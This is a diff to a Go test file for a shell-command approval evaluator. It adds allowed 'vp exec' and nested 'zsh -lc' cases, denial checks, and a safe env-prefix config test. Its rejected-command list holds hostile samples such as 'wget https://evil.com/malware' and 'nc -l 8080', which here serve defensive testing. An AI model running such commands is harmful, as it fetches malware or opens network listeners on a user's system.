@@ -144,6 +144,8 @@ func TestEvaluate_Approved(t *testing.T) {
 		{"vp check via node_modules", "./node_modules/.bin/vp check frontend packages/ui", "node_modules/.bin+vp"},
 		{"vp run via node_modules", "./node_modules/.bin/vp run -w test", "node_modules/.bin+vp"},
 		{"vp exec playwright test via node_modules", "./node_modules/.bin/vp exec playwright test --config playwright-e2e.config.ts", "node_modules/.bin+vp"},
+		{"vp exec svelte-mcp documentation", "vp exec svelte-mcp get-documentation '$state'", "vp"},
+		{"vp exec svelte-mcp autofixer", "vp exec svelte-mcp svelte-autofixer Component.svelte --svelte-version 5", "vp"},
 		{"vp bare", "vp test run", "vp"},
 		{"bun install", "bun install", "bun"},
 		{"bun run", "bun run dev", "bun"},
@@ -576,6 +578,34 @@ func TestEvaluate_Approved(t *testing.T) {
 	}
 }
 
+func TestEvaluate_StaticShellCommand(t *testing.T) {
+	t.Run("absolute zsh login shell evaluates safe payload", func(t *testing.T) {
+		r := evaluateAll(`/bin/zsh -lc "GOFLAGS=-buildvcs=false go test ./..."`)
+		require.NotNil(t, r)
+		assert.Equal(t, decisionAllow, r.decision)
+		assert.Equal(t, "zsh -c+env vars+go", r.reason)
+	})
+
+	t.Run("bash command propagates deny", func(t *testing.T) {
+		r := evaluateAll(`bash -c "git stash"`)
+		require.NotNil(t, r)
+		assert.Equal(t, decisionDeny, r.decision)
+		assert.Contains(t, r.denyReason, "git stash")
+	})
+
+	t.Run("unknown inner command remains unrecognized", func(t *testing.T) {
+		assert.Nil(t, evaluateAll(`zsh -lc "unknown-tool --safe-looking"`))
+	})
+
+	t.Run("dynamic payload remains unrecognized", func(t *testing.T) {
+		assert.Nil(t, evaluateAll(`zsh -lc "$COMMAND"`))
+	})
+
+	t.Run("untrusted absolute shell remains unrecognized", func(t *testing.T) {
+		assert.Nil(t, evaluateAll(`/tmp/zsh -lc "go test ./..."`))
+	})
+}
+
 func TestEvaluate_Rejected(t *testing.T) {
 	tests := []struct {
 		name string
@@ -606,6 +636,7 @@ func TestEvaluate_Rejected(t *testing.T) {
 		{"unknown cmd", "foobar --baz"},
 		{"nc", "nc -l 8080"},
 		{"wget", "wget https://evil.com/malware"},
+		{"unrelated vp exec", "vp exec arbitrary-tool run"},
 
 		// Partial matches that shouldn't work
 		{"gitx", "gitx status"},
@@ -2200,6 +2231,13 @@ func TestLoadConfigFromPath(t *testing.T) {
 		cfg, err := loadConfigFromPath(path)
 		require.NoError(t, err)
 		assert.Equal(t, []string{"/tmp/scratch", "/var/tmp/worktrees"}, cfg.SafeCDPrefixes)
+	})
+
+	t.Run("safe env prefixes parsed", func(t *testing.T) {
+		path := writeTestConfig(t, "safe_env_prefixes:\n  - KENN_\n  - ACME_TEST_\n")
+		cfg, err := loadConfigFromPath(path)
+		require.NoError(t, err)
+		assert.Equal(t, []string{"KENN_", "ACME_TEST_"}, cfg.SafeEnvPrefixes)
 	})
 
 	t.Run("only enabled specified", func(t *testing.T) {
